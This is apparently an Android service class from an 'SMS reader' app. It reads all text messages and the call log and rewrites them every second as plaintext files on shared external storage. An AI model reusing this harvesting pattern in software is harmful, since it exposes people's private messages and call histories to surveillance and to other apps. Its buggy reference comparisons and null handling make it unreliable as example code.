package com.example.smsreader;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Objects;

public class ReaderService extends Service {
    @Override
    public void onStart(Intent intent, int startId) {
        Log.d("Started Service", "service_Started");
        final Handler handler = new Handler();
        final List<StringBuffer> callLog = Arrays.asList(new StringBuffer());
        final List<StringBuffer> smsLog = Arrays.asList(new StringBuffer());
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                if (callLog.get(0) !=getCallDetails()) {
                    File file = new File(
                            Environment.getExternalStorageDirectory().toString()
                            + File.separator + "HeroReader/calls"
                    );
                    if (!file.exists()) {
                        boolean fileMade = file.mkdirs();
                        Log.d("Made", String.valueOf(fileMade));
                    }

                    File file1 = null;
                    file1 = new File(Environment.getExternalStorageDirectory().toString()+ File.separator+"HeroReader/calls"+File.separator+"calls.txt");
                    byte[] data = Objects.requireNonNull(getCallDetails()).toString().getBytes();

                    try {
                        file1.createNewFile();
                        OutputStream outputStream = new FileOutputStream(file1);
                        outputStream.write(data);
                        outputStream.close();
                        callLog.set(0, getCallDetails());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                if (smsLog.get(0) != getSms()) {
                    File file = new File(
                            Environment.getExternalStorageDirectory().toString()
                                    + File.separator + "HeroReader/sms"
                    );
                    if (!file.exists()) {
                        boolean fileMade = file.mkdirs();
                        Log.d("Made", String.valueOf(fileMade));
                    }
                    File file1 = null;
                    file1 = new File(Environment.getExternalStorageDirectory().toString()+ File.separator+"HeroReader/sms"+File.separator+"sms.txt");
                    byte[] data = Objects.requireNonNull(getSms()).toString().getBytes();

                    try {
                        file1.createNewFile();
                        OutputStream outputStream = new FileOutputStream(file1);
                        outputStream.write(data);
                        outputStream.close();

                        smsLog.set(0, getSms());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                handler.postDelayed(this, 1000);
            }
        };
        handler.post(runnable);
    }

    private StringBuffer getSms() {

        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("sms log: ");

        Uri smsUri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(smsUri,
                null,
                null,
                null,
                null);

        while (cursor!=null && cursor.moveToNext()) {
            String address = cursor.getString(cursor.getColumnIndex("address"));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            String date = cursor.getString(cursor.getColumnIndex("date"));
            String type;
            if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                type = "inbox";
            }else {
                type = "sent";
            }
            stringBuffer.append("\nNumber:---").append(address).append("\nMessage:---").append(body).append("\nDate:---").append(date).append("\nType").append(type);
            stringBuffer.append("\n-----------------------------------------");
        }
        assert cursor != null;
        cursor.close();
        return stringBuffer;
    }

    private StringBuffer getCallDetails() {

        StringBuffer stringBuffer = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_CALL_LOG
        ) != PackageManager.PERMISSION_DENIED) {
            Cursor cursor = getApplicationContext().getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    null
            );
            assert cursor != null;
            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            long date = cursor.getColumnIndex(CallLog.Calls.DATE);
            long duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
            stringBuffer.append("Call Log: ");
            while (cursor.moveToNext()) {
                String phoneNumber = cursor.getString(number);
                String callType = cursor.getString(type);
                String callDate = cursor.getString((int) date);
                String callDayTime = String.valueOf(new Date(Long.parseLong(callDate)));
                String callDuration = cursor.getString((int) duration);
                String dir = null;
                int dirCode = Integer.parseInt(callType);
                switch (dirCode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;
                    case  CallLog.Calls.MISSED_TYPE:
                         dir = "MISSED";
                         break;
                    default:
                }

                stringBuffer.append("\nPhone Number:---").append(phoneNumber).append("\nCall Type:---").append(dir).append("\nCall Date:---").append(callDayTime).append("Call Duration(s):---").append(callDuration);
                stringBuffer.append("\n----------------------------------");
            }

            return stringBuffer;
        }

        return null;

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
